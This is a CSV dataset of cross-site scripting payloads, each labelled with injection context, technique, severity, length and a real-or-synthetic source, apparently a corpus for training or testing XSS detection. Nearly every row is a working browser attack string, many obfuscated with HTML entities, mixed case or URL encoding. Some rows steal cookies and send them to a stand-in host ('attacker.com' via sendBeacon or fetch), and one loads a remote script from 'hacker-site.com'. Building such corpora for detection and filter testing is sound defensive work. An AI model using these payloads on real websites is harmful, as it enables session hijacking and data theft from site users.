payload,context,technique,severity,length,source
__proto__[%22onpopstate%22]=confirm(location.hash),dom_sink,synthetic,medium,50,synthetic
"\"" onpageshow=prompt(document.domain)//",attribute_escape,synthetic,medium,39,synthetic
onselect=javascript:prompt(location.hash),event_handler,synthetic,medium,41,synthetic
"""><base onpageswap=alert('XSS')>",tag_injection,synthetic,medium,32,synthetic
"<script draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,89,real
' ><svG oNpaSte=coNsoLe.Log(1)>,attribute_escape,synthetic,medium,31,synthetic
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,script_injection,case_variation,low,51,real
"<div draggable=""true"" contenteditable>drag me</div><meta ondrop=alert(1) contenteditable style=display:block>drop here</meta>",tag_injection,none,medium,125,real
"<big onmouseleave=""alert(1)"">AnonKryptiQuz</big>",tag_injection,none,medium,48,real
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=f&#101;tch(bto&#97;(docum&#101;nt.cooki&#101;))>"")",dom_sink,synthetic,low,158,synthetic
"<script
>alert(1)</script>",script_injection,synthetic,medium,26,synthetic
'><img src=x onhashchange=confirm(document.domain)>,attribute_escape,synthetic,medium,51,synthetic
ontr&#97;nsitionst&#97;rt=confirm&#40;loc&#97;tion.h&#97;sh&#41;,event_handler,synthetic,low,64,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""print()""></div>",tag_injection,none,low,175,real
"Obj&#101;ct.&#97;ssign(window,{""onp&#97;g&#101;r&#101;v&#101;&#97;l"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,95,synthetic
 on&#97;nim&#97;tion&#101;nd=consol&#101;.log('XSS'),event_handler,synthetic,low,52,synthetic
%3Cmtext onstalled=console.log(document.domain)/%3E,tag_injection,synthetic,medium,51,synthetic
"<marquee onmouseup=""alert(1)"">AnonKryptiQuz</marquee>",tag_injection,none,medium,53,real
<script>console.log(1)</script>,script_injection,synthetic,medium,31,synthetic
\%22 ongotpointercapture=confirm(location.hash)//,attribute_escape,synthetic,medium,49,synthetic
'%3E%3Cimg src=x onbegin=confirm(location.hash)%3E,attribute_escape,synthetic,medium,50,synthetic
"(new Function(%22confirm(navigator.sendBeacon(%27//attacker.com%27,document.cookie))%22))();",dom_sink,synthetic,high,92,synthetic
"<marquee onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,76,real
J&#97;VasCriPt:ConSolE.lOg(DocUmeNt.DomAin),js_uri,synthetic,medium,43,synthetic
\' on&#97;uxclick=consol&#101;.log(1)//,attribute_escape,synthetic,low,39,synthetic
"<ul oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",tag_injection,none,medium,67,real
"<image2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</image2>",tag_injection,none,medium,93,real
' onp&#97;g&#101;hid&#101;=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,low,66,synthetic
<dd onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</dd><input value=clickme>,tag_injection,none,medium,104,real
"<mark ondblclick=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,48,real
"javascript:""/*\""/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>",js_uri,comment_injection,medium,143,real
' ><svG oNbeForEpaSte=coNsoLe.Log('XSS')>,attribute_escape,synthetic,medium,41,synthetic
<kbd onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"${{%27confirm(document.domain)%27.replace(%27confirm(document.domain)%27,%27%27)}}",template_injection,synthetic,medium,82,synthetic
"__proto__[""ons&#101;&#97;rch""]=&#101;v&#97;l(String.fromCh&#97;rCod&#101;(88,83,83))",dom_sink,synthetic,low,84,synthetic
'><img src=x ondrop=alert('XSS')>,attribute_escape,synthetic,medium,33,synthetic
<map id=x tabindex=1 onbeforeactivate=alert(1)></map>,tag_injection,none,medium,53,real
{{$on.constructor('confirm(1)')()}},template_injection,synthetic,medium,35,synthetic
' ><svG oNpoPstAte=alErt(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,42,synthetic
"<set onclick=""alert(1)"" style=display:block>AnonKryptiQuz</set>",tag_injection,none,medium,63,real
\' onbeforecut=console.log(1)//,attribute_escape,synthetic,medium,31,synthetic
onselect=console.log(document.domain),event_handler,synthetic,medium,37,synthetic
"""/><script>+-+-1-+-+confirm(1)</script>",script_injection,none,medium,39,real
\' onbeforecut=\u0061lert(document.domain)//,attribute_escape,synthetic,low,44,synthetic
&quOt; onPoiNteRmoVe=ProMpt(loCatIon.haSh) x=&quOt;,attribute_escape,synthetic,medium,51,synthetic
<td onMozFulLscReeNchAngE=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,53,synthetic
"%22 ><svg onanimationiteration=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,68,synthetic
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",tag_injection,none,medium,111,real
"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></li>",tag_injection,none,medium,158,real
`%3E%3Cimg src=x onpagehide=prompt('XSS')%3E,attribute_escape,synthetic,medium,44,synthetic
ontr&#97;nsitionst&#97;rt=prompt/*x*/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,60,synthetic
oninv&#97;lid=prompt&#40;1&#41;,event_handler,synthetic,low,31,synthetic
	oninput=prompt(loc&#97;tion.h&#97;sh),event_handler,synthetic,medium,38,synthetic
%3C!--%3E%3Canimatetransform onpointerdown=prompt(1)%3E,tag_injection,synthetic,medium,55,synthetic
"<style>:target {color:red;}</style><a id=x style=""transition:color 1s"" ontransitionend=alert(1)></a>",tag_injection,none,medium,100,real
'><Img srC=x onDblCliCk=ConFirM(1)>,attribute_escape,synthetic,medium,35,synthetic
' ><svg on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in)>,attribute_escape,synthetic,medium,70,synthetic
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>""",dom_sink,synthetic,low,102,synthetic
"javascript://</title></textarea></style></script --><li '//"" '*/alert()/*', onclick=alert()//",js_uri,none,medium,93,real
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=print()></kbd>",tag_injection,none,low,123,real
"<audio onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</audio>",tag_injection,none,medium,66,real
"setInterval(%22console.log(btoa(document.cookie))%22,100)",dom_sink,synthetic,high,57,synthetic
<li onpointerdown=alert(1) style=display:block>AnonKryptiQuz</li>,tag_injection,none,medium,65,real
&quot; ondblclick=\u0061lert(1) x=&quot;,attribute_escape,synthetic,low,40,synthetic
"location=""javascript:console.log(String.fromCharCode(88,83,83))""",dom_sink,synthetic,high,64,synthetic
<&#97;nim&#97;t&#101;tr&#97;nsform oncont&#101;xtm&#101;nu=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,92,synthetic
"<svg><script xlink:href=""{ASCII}data:,alert(1)""></script></svg>",script_injection,none,medium,63,real
"<tfoot onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</tfoot>",tag_injection,none,medium,63,real
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable style=display:block>drop here</summary>",tag_injection,none,medium,135,real
"\"" onpopstate=alert(document.domain)//",attribute_escape,synthetic,medium,38,synthetic
onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS'),event_handler,synthetic,medium,54,synthetic
"Obj&#101;ct.&#97;ssign(window,{""onr&#101;s&#101;t"":consol&#101;.log})",dom_sink,synthetic,low,69,synthetic
"<footer draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</footer>",tag_injection,none,medium,89,real
"\"" onreset=prompt(location.hash)//",attribute_escape,synthetic,medium,34,synthetic
'><img src=x onfocus=alert(1)>,attribute_escape,synthetic,medium,30,synthetic
<teMplAte onResEt=AleRt(LocAtiOn.HasH)/>,tag_injection,synthetic,medium,40,synthetic
\' onfocus=console.log(1)//,attribute_escape,synthetic,medium,27,synthetic
&quot; ons&#101;&#97;rch=&#97;l&#101;rt(1) x=&quot;,attribute_escape,synthetic,low,51,synthetic
j&#97;v&#97;script:prompt/*x*/(loc&#97;tion.h&#97;sh),js_uri,synthetic,low,53,synthetic
<scRipT>wIndOw['prOmpT'](doCumEnt.doMaiN)</scRipT>,script_injection,synthetic,low,50,synthetic
"""><div onpointerrawupdate=""console.log('AnonKryptiQuz')"">Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_ClickHere</div>",tag_injection,none,medium,149,real
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>,tag_injection,none,medium,61,real
"<marquee draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</marquee>",tag_injection,none,medium,90,real
<plaintext onrepeat=prompt(%27XSS%27)/>,tag_injection,synthetic,medium,39,synthetic
OnpLayIng=alErt(1),event_handler,synthetic,medium,18,synthetic
"'%3E%3Cimg src=x onbeforetoggle=alert(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,71,synthetic
\' onp&#97;us&#101;=confirm('XSS')//,attribute_escape,synthetic,medium,36,synthetic
on&#97;uxclick=consol&#101;.log('XSS'),event_handler,synthetic,low,38,synthetic
' onpointermove=confirm(document.domain) ',attribute_escape,synthetic,medium,42,synthetic
"<em onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></em>",tag_injection,none,medium,277,real
"<kbd onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</kbd>",tag_injection,none,medium,82,real
""" ><svG oNtrAnsItiOnsTarT=cOnfIrm(doCumEnt.doMaiN)>",attribute_escape,synthetic,medium,51,synthetic
%3Cselect onpointermove=prompt('XSS')/%3E,tag_injection,synthetic,medium,41,synthetic
<multicol onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
' ><svg onwheel=alert('XSS')>,attribute_escape,synthetic,medium,29,synthetic
""" ><svg oncopy=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,52,synthetic
' ><svG oNpaGerEveAl=ConSolE.lOg(DocUmeNt.DomAin)>,attribute_escape,synthetic,medium,50,synthetic
<m&#101;t&#97; src=x onpoint&#101;rov&#101;r=confirm(1)>,tag_injection,synthetic,medium,56,synthetic
\' onpopstate=\u0061lert(1)//,attribute_escape,synthetic,low,29,synthetic
'-confirm(document.domain)-',dom_sink,none,medium,28,real
""" oNweBkiTfuLlsCreEncHanGe=ConSolE.lOg(DocUmeNt.DomAin) """,attribute_escape,synthetic,medium,57,synthetic
"<maRquEe OnbEfoRetOggLe=AleRt(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection,synthetic,high,62,synthetic
""" oNtoUchStaRt=ProMpt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,40,synthetic
&quot; onpromptdismiss=&#97;l&#101;rt('XSS') x=&quot;,attribute_escape,synthetic,low,53,synthetic
"<big onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</big>",tag_injection,none,medium,67,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><textarea id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></textarea>",tag_injection,none,medium,186,real
%3Cplaintext onrepeat=prompt('XSS')/%3E,tag_injection,synthetic,medium,39,synthetic
%3C!--%3E%3Cxss ontoggle=console.log('XSS')%3E,tag_injection,synthetic,medium,46,synthetic
\' OntOggLe=ConFirM('XSS')//,attribute_escape,synthetic,medium,28,synthetic
<!--><s&#101;l&#101;ct ons&#101;curitypolicyviol&#97;tion=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,89,synthetic
%22><audio onpopstate=confirm(location.hash)>,tag_injection,synthetic,medium,45,synthetic
"<!--><marquee onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,71,synthetic
"onscrollsnapchange=confirm&#40;String.fromCharCode(88,83,83)&#41;",event_handler,synthetic,high,65,synthetic
""" %3E%3Csvg onbeforepaste=confirm(document.domain)%3E",attribute_escape,synthetic,medium,53,synthetic
ons&#101;l&#101;ct=consol&#101;.log&#40;docum&#101;nt.dom&#97;in&#41;,event_handler,synthetic,low,69,synthetic
<frameset><frame id=x onfocusin=alert(1)>,tag_injection,none,medium,41,real
"<nobr onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</nobr>",tag_injection,none,medium,61,real
"LocAtiOn.HreF=""JavAscRipT:cOnfIrm(doCumEnt.coOkiE)""",dom_sink,synthetic,high,51,synthetic
<form><button formaction=javascript&colon;alert(1282)>CLICKME,generic,none,medium,61,real
onwebkitfullscreenchange=\u0061lert/*x*/(document.domain),event_handler,synthetic,low,57,synthetic
"<BR SIZE=""&{alert('AnonKryptiQuz')}"">",attribute_escape,case_variation,medium,37,real
location.href=%22javascript:fetch(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink,synthetic,high,78,synthetic
"Enter_Mouse_Pointer_Here_to_get_AnonKryptiQuz<P/onpointerenter=""alert(1)"">",tag_injection,case_variation,medium,74,real
'><img src=x onp&#97;g&#101;show=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,57,synthetic
<!--><object ontouchstart=console.log(location.hash)>,tag_injection,synthetic,medium,53,synthetic
`%3E%3Cimg src=x onmousewheel=alert(location.hash)%3E,attribute_escape,synthetic,medium,53,synthetic
"<rb draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",tag_injection,none,medium,81,real
"<font onmouseup=""alert(1)"">AnonKryptiQuz</font>",tag_injection,none,medium,47,real
"element.insertAdjacentHTML(%22beforeend%22,%22<img src=x onerror=alert(navigator.sendBeacon(%27//attacker.com%27,document.cookie))>%22)",dom_sink,synthetic,high,135,synthetic
 onBegIn=ConSolE.lOg('XSS'),event_handler,synthetic,medium,27,synthetic
"""><img src=x onauxclick=\u0061lert(1)>",attribute_escape,synthetic,low,38,synthetic
<form/onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,82,synthetic
<script	>console.log(location.hash)</script>,script_injection,synthetic,medium,44,synthetic
"<font draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</font>",tag_injection,none,medium,85,real
\%22 oncontextmenu=alert(1)//,attribute_escape,synthetic,medium,29,synthetic
%3Canimate	onfocus=console.log(document.domain)%3E,tag_injection,synthetic,medium,50,synthetic
%22><marquee onpopstate=alert(%27XSS%27)>,tag_injection,synthetic,medium,41,synthetic
onpointermove=javascript:console.log(1),event_handler,synthetic,medium,39,synthetic
%3Cform src=x ongesturestart=console.log('XSS')%3E,tag_injection,synthetic,medium,50,synthetic
\%22 onmouseover=prompt(1)//,attribute_escape,synthetic,medium,28,synthetic
"data:text/html,<script>confirm(1)</script>",js_uri,synthetic,medium,42,synthetic
"<big ondblclick=""alert(1)"">AnonKryptiQuz</big>",tag_injection,none,medium,46,real
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=aLerT(bToa(doCumEnt.coOkiE))>""",dom_sink,synthetic,high,74,synthetic
{% prompt docum&#101;nt.dom&#97;in %},template_injection,synthetic,low,37,synthetic
' ><svg ondragenter=confirm('XSS')>,attribute_escape,synthetic,medium,35,synthetic
%22><object onwebkitanimationend=alert(location.hash)>,tag_injection,synthetic,medium,54,synthetic
 onscroll&#101;nd=&#97;l&#101;rt('XSS'),event_handler,synthetic,low,39,synthetic
<i onmousewheel=alert(1) style=display:block>requires scrolling,tag_injection,none,medium,63,real
"OnsCroLlsNapChaNge=jaVasCriPt:ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,68,synthetic
<animatetransform/onpointerdown=prompt(1)>,tag_injection,synthetic,medium,42,synthetic
`><img src=x onscrollsnapchange=alert(1)>,attribute_escape,synthetic,medium,41,synthetic
"%22 onclose=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape,synthetic,high,58,synthetic
""" oninvalid=confirm(1) """,attribute_escape,synthetic,medium,24,synthetic
<di&#97;log src=x onpoint&#101;rov&#101;r=confirm(1)>,tag_injection,synthetic,medium,53,synthetic
' ><svG oNmoUseUp=ProMpt(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,42,synthetic
%27 ><svg onsearch=prompt(location.hash)>,attribute_escape,synthetic,medium,41,synthetic
<svg onpointerleave=alert(1) style=display:block>AnonKryptiQuz</svg>,tag_injection,none,medium,68,real
 onFocUsoUt=ConFirM('XSS'),event_handler,synthetic,medium,26,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dl ondrop=alert(1) contenteditable style=display:block>drop here</dl>",tag_injection,none,medium,121,real
"%22><img src=x onvolumechange=alert(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
' ><svg ontouchmove=\u0061lert(location.hash)>,attribute_escape,synthetic,low,46,synthetic
"window[%22confirm%22](String.fromCharCode(88,83,83))",dom_sink,synthetic,high,52,synthetic
	onmouseenter=alert(1),event_handler,synthetic,medium,22,synthetic
"<noscr	ipt onbeforematch=confirm(String.fromCharCode(88,83,83)) onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,117,synthetic
'><Img srC=x onPoiNteRmoVe=ProMpt(loCatIon.haSh)>,attribute_escape,synthetic,medium,49,synthetic
<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,tag_injection,none,medium,75,real
`${alert(1)}`,template_injection,none,medium,13,real
"EvaL(""ProMpt(loCatIon.haSh)"")",dom_sink,synthetic,medium,29,synthetic
<button popovertarget=x>Click me</button><output onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</output>,tag_injection,none,medium,108,real
<a OnmOzfUllScrEenChaNge=alErt(loCatIon.haSh) onMozFulLscReeNchAngE=aLerT(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,89,synthetic
""" ><svg onsearch=alert('XSS')>",attribute_escape,synthetic,medium,30,synthetic
<m&#97;th src=x onpl&#97;ying=consol&#101;.log('XSS')>,tag_injection,synthetic,low,54,synthetic
"<embed onmouseleave=""alert(1)"">AnonKryptiQuz</embed>",tag_injection,none,medium,52,real
%22 onfocus=alert(%27XSS%27) autofocus=%22,attribute_escape,synthetic,medium,42,synthetic
"s&#101;tTim&#101;out(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"",0)",dom_sink,synthetic,low,80,synthetic
'%3E%3Cimg src=x ondragstart=console.log(location.hash)%3E,attribute_escape,synthetic,medium,58,synthetic
`%3E%3Cimg src=x onhashchange=alert('XSS')%3E,attribute_escape,synthetic,medium,45,synthetic
<script/onpoint&#101;rr&#97;wupd&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,88,synthetic
<deTaiLs Src=x OnrEpeAt=ProMpt(1)>,tag_injection,synthetic,medium,34,synthetic
